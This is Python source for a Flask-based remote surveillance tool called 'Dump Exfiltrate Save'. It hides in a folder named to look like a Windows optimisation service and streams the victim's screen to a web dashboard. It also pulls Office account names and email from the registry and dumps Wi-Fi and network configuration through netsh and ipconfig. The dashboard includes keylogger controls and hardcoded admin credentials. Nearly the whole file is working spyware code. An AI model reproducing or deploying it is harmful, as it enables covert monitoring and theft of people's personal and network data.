""" MODULE LIST """
import os
import threading
import time
import socket
import io
from collections import deque
from flask import Flask, Response, render_template_string, send_file, jsonify, request, redirect, url_for, make_response
import mss
from PIL import Image
import platform
import psutil
import subprocess
import requests
import winreg
import random
import hashlib

""" 
FUNCION: makeProgramDir
Function explanation:
This function (makeProgramDir), gets the username of the current user that is logged in and store it in the variable 'user_login'
after storing the data in the 'user_login' variable, it makes another variable ('screen_share_dir') with the path that we want to create.
At the end of the function it makes the directory with the imported module 'os' and it changes the working program directory from current file path to the directory that we made form the variable 'screen_share_dir'
"""
#=^.^=
def makeProgramDir():
    user_login = os.getlogin()
    screen_share_dir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
    os.makedirs(screen_share_dir, exist_ok=True)
    os.chdir(screen_share_dir)

"""
FUNCTION: capture_images
Function explanation:
This function (capture_images), continuously captures screenshots from the primary monitor using the imported 'mss' library.
It initializes a global list called 'images' to store the captured images.
Inside a loop, it grabs the current screen image, converts it to a PNG format, and appends the image data to the images list.
If the list exceeds five images, it removes the oldest one to maintain a fixed size.
The function also calculates the time taken for each capture and adjusts the sleep duration to achieve a target frame rate of 120 frames per second, ensuring efficient and timely image capturing.
"""
#=^.^=
def capture_images():
    global images
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            start = time.time()
            sct_img = sct.grab(monitor)
            img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
            with io.BytesIO() as output:
                img.save(output, format='PNG')
                images.append(output.getvalue())
                if len(images) > 5:
                    images.popleft()
            elapsed = time.time() - start
            time.sleep(max(0, 1/30 - elapsed))

""" COSTANT: 'images' global list variable """
#=^.^=
images = deque(maxlen=5)

""" 
FUNCION: scan_wifi
Function explanation:
It uses the 'subprocess' module to execute a command, in this case 'netsh wlan show all' 
Command 'netsh wlan show all':
-Netsh : Network Shell 
-Wlan : Wifi interface
-Show : function to show informations about the selected interface
-All : Show all the data and settings
"""
#=^.^=
def scan_wifi():
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8', errors='replace')
        return result
    except Exception as e:
        return str(e)

""" 
FUNCTION: get_public_ip
Function explanation:
It sends a get request with the imported module 'requests' to the api site 'https://api.ipify.org'
"""
#=^.^=
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').content.decode('utf8')
    except requests.RequestException as e:
        return f"Error getting public IP: {str(e)}"

"""
FUNCTION: get_local_network_info
Function explanation:
It uses the imported module 'subprocess' to run a command, in this case the command is 'ipconfig /all'
"""
#=^.^=
def get_local_network_info():
    try:
        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, encoding='utf-8', errors='replace', check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {str(e)}"
    except Exception as e:
        return f"An error occurred: {str(e)}"

"""
FUNCTION: get_registry_values
Function explanation:
Get registry values from the assigned path and the assigned key by the registry editor (regedit)
"""
######################################################################################################
def get_registry_values(path, key):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
            return winreg.QueryValueEx(keyHandle, key)[0]
    except FileNotFoundError:
        return None
    except Exception as e:
        return str(e)

"""FUNCTION: get_user_info_from_registry
Function explanation:
Uses the 'get_registry_values' function to retrieve values and store it in variables
"""
######################################################################################################
def get_user_info_from_registry():
    userInfo = {}
    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
            i = 0
            while True:
                try:
                    subkeyName = winreg.EnumKey(parentKey, i)
                    subkeyPath = f"{registryPath}\\{subkeyName}"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
                        email = get_registry_values(subkeyPath, "EmailAddress")
                        if email:
                            userInfo["EmailAddress"] = email
                        firstName = get_registry_values(subkeyPath, "FirstName")
                        if firstName:
                            userInfo["FirstName"] = firstName
                        lastName = get_registry_values(subkeyPath, "LastName")
                        if lastName:
                            userInfo["LastName"] = lastName
                        if len(userInfo) == 3:
                            break
                except OSError:
                    break
                i += 1
    except Exception as e:
        userInfo['Error'] = str(e)
    
    return userInfo
######################################################################################################

"""
FUNCTION: get_local_ip
Function explanation:
This function (get_local_ip), simply use the imported library 'socket' to retrieve the local ip address

Examples of locals ip:
10.XXX.XXX.XXX  ----\
172.16.XXX.XXX       | - Where XXX is a number from 0 to 255
192.168.XXX.XXX ----/
"""
#=^.^=
def get_local_ip():
    return socket.gethostbyname(socket.gethostname())

""" COSTANT: 'SERVER_HOST' is a costant with the local ip of the target machine """
#=^.^=
SERVER_HOST = get_local_ip()

""" COSTANT: 'SERVER_PORT' is a costant with a default port assigned from the developer """
#=^.^=
SERVER_PORT = 31338

""" COSTANT: 'login_page' is a costant with the login page html code """
#=^.^=
login_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
    <meta name="copyright" content="Fedi 2025©">
    <meta name="dc.language" content="ita" scheme="RFC1766">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
</head>
<body>
    <h2>Admin Login</h2>
    <form action="/login" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

""" COSTANT: 'dashboard_page' is a costant with the dashboard page html code """
dashboard_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC
    <meta name="copyright" content="Fedi 2025©">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
</head>
<body>
    <h1>Action available</h1>
    <ol>
        <li><a href="#ScreenShare">Screen share</a></li>
        <li><a href="#Keylogger">Keylogger log</a></li>
        <li><a href="#Usage">Usage stats</a></li>
    </ol>
    <div id="screenShare">
        <script>
            function updateImage() {{
                const img = document.getElementById('screenshot');
                img.src = '/image.png?' + new Date().getTime();
            }}
            setInterval(updateImage, 100); // 10 FPS

            function saveScreenshot() {{
                const link = document.createElement('a');
                link.href = '/download.png';
                link.download = 'screenshot.png';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }}

            const refreshBtn = document.getElementById("btnRefresh");
            function handleClick() {{
                history.go(0);
            }}

            refreshBtn.addEventListener("click", handleClick);
        </script>
        <h1>Screen share</h1>
        <button type="button" onclick="saveScreenshot()">Take &#38; Download screenshot from host</button>
        <button id="btnRefresh" type="button" onclick="location.reload(true)">Refresh page</button>
        <div>
            <img id="screenshot" src="/image.png" alt="Screenshot" />
        </div>
    </div>
    <div id="Keylogger">
        <h1>Keylogger</h1>
        <button type="button">Start keylogger</button>
        <button type="button">Stop keylogger</button>
    </div>
    <div id="Usage">
        <h1>PC informations</h1>
        <p>Hey, we have another page for the PC information. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
    </div>
</body>
</html>
"""

""" COSTANT: 'info_page' is a costant with the code of the html page with the target machine informations"""
#=^.^=
info_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
    <meta name="copyright" content="Fedi 2025©">
    <meta name="dc.language" content="ita" scheme="RFC1766">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
</head>
<body>
    <h1> Informations </h1>
    <ul>
        <li><a href="#username">Username</a></li>
        <li><a href="#os">Operating System</a></li>
        <li><a href="#cpu">Cpu</a></li>
        <li><a href="#memory">Memory</a></li>
        <li><a href="#wifi">network</a></li>
    </ul>
    <h2 id="username">Username</h2>
    <p>{str(os.getlogin())}</p>
    <h2 id="os">Operating system infromations</h2>
    <h3>Operating System</h3>
    <p>{str(platform.system())}</p>
    <h3>OS Version</h3>
    <p>{str(platform.version())}</p>
    <h3>Architecture</h3>
    <p>{str(platform.architecture())}</p>
    <h2 id="cpu">Cpu informations</h2>
    <h3>Processor</h3>
    <p>{platform.processor()}</p>
    <h3>CPU cores</h3>
    <p>{psutil.cpu_count(logical=False)}</p>
    <h3>Logical CPUs</h3>
    <p>{psutil.cpu_count(logical=True)}</p>
    <h2 id="memory">Memory infromations</h2>
    <h3>Memory</h3>
    <p>{psutil.virtual_memory().total / (1024 ** 3):.2f} GB</p>
    <h3>Used memory</h3>
    <p>{psutil.virtual_memory().used / (1024 ** 3):.2f} GB</p>
    <h3>Free memory</h3>
    <p>{psutil.virtual_memory().available / (1024 ** 3):.2f} GB</p>
    <h3>Disk usage</h3>
    <p>{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB</p>
    <h3>Used disk</h3>
    <p>{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB</p>
    <h3>Free disk</h3>
    <p>{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB</p>
    <h2 id="wifi">Wifi informations</h2>
    <h3>Hostname</h3>
    <p>{socket.gethostname()}</p>
    <h3>IP Address</h3>
    <p>{get_local_ip()}</p>
    <h3>Public IP</h3>
    <p>{get_public_ip()}</p>
    <h3>Local Network Info</h3>
    <p>{get_local_network_info()}</p>
    <h3>WiFi Networks</h3>
    <p>{scan_wifi()}</p>
</body>
</html>"""

""" COSTANT: 'random_access_value' random value generator for cookies """
#=^.^=
random_access_value = str(hashlib.sha256(str(random.randint(0,100000000001)).encode()).hexdigest())
admin_access_value = str(hashlib.sha256(("admin" + str(random.randint(0,100000000001))).encode()).hexdigest())

""" COSTANT: 'credentials' is a dictonary with the credentials """
#=^.^=
credentials = {
    "PDES-Admin" : "PDES-Password"
}

""" COSTANT: 'app' is a costant with the flask app function form the imported library 'flask' """
#=^.^=
app = Flask(__name__)

""" '/' PATH: Login path """
#=^.^=
@app.route('/')
def home():
    response = make_response(render_template_string(login_page))
    return response

#=^.^=
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    if username in credentials and credentials[username] == password:
        response = make_response(redirect(url_for('dashboard')))
        response.set_cookie('UwU', admin_access_value, max_age=60*60*1)
        return response
    else:
        return "Invalid credentials", 401

""" '/4ee1711430410e5f2ec9d8188ac1f134' PATH: Dashboard path """
@app.route('/4ee1711430410e5f2ec9d8188ac1f134')
def dashboard():
    response = app.make_response(render_template_string(dashboard_page))
    userCookie = request.cookies.get("UwU")
    if userCookie == admin_access_value:
        return response
    else:
        return "403 Forbitten", 403

""" '/image.png' PATH: Path used to store images """
#=^.^=
@app.route('/image.png')
def image():
    response = app.make_response(Response(images[-1], mimetype='image/png'))
    userCookie = request.cookies.get("UwU")
    if userCookie == admin_access_value:
        if images:
            return response
        return "404 Not Found", 404
    else:
        return "403 Forbitten", 403


""" '/download.png' PATH: Path used to download the stored images """
#=^.^=
@app.route('/download.png')
def download_image():
    response = app.make_response(send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png'))
    userCookie = request.cookies.get("UwU")
    if userCookie == admin_access_value:
        if images:
            return response
        return "404 Not Found", 404
    else:
        return "403 Forbitten", 403

""" '/16f0ada2144eaa0b96478073d5e3d78b' PATH: Path used to store system informations """
#=^.^=
@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
def informations():
    response = app.make_response(render_template_string(info_page))
    userCookie = request.cookies.get("UwU")
    if userCookie == admin_access_value:
        return response
    else:
        return response

if __name__ == "__main__":
    makeProgramDir()
    print("Admin access cookie value: ", admin_access_value)
    images = deque(maxlen=5)
    threading.Thread(target=capture_images, daemon=True).start()
    app.run(host=SERVER_HOST, port=SERVER_PORT)
